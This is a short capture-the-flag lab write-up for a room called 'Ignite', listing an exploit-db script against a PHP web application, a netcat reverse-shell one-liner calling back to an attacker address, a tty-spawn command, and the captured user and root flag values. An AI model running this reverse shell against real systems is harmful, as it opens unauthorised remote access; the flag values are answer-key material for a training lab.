# Ignite 

ip : `10.10.227.139`

using the exploit at `/usr/share/exploitdb/exploits/php/webapps/49487.rb`

getting reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.48.110 4444>/tmp/f

```

spawning a tty shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
```





| flag | value |
|------|-------|
| User.txt | 6470e394cbf6dab6a91682cc8585059b |
| Root.txt | b9bbcb33e11b80be759c4e844862482d |
